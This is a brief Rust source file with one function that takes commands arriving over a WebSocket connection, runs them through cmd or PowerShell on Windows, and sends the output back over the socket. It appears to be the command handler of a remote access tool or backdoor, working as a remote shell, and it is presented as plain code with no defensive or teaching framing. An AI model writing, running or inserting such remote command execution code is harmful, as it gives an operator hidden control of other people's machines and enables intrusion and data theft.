use std::net::TcpStream;
use std::process::Command;
use tungstenite::stream::MaybeTlsStream;
use tungstenite::{Message, WebSocket};

pub(crate) fn handle_remote_cmd(payload: &[u8], socket: &mut WebSocket<MaybeTlsStream<TcpStream>>) {
	// Executes CMD if first byte of payload is 0 or anything
	// Executes PowerShell command if first byte == 1
	
	let cmd = String::from_utf8_lossy(&payload[1..]);
	let mut mode = ("cmd","/C");
	if payload[0] == b'1' {
		mode = ("powershell", "-Command");
	};
	let output = Command::new(mode.0).arg(mode.1).arg(&*cmd).output().expect("Failed to execute command");
	let response = String::from_utf8_lossy(&output.stdout);
	socket.send(Message::from(response.to_string())).expect("Failed to send response");
}
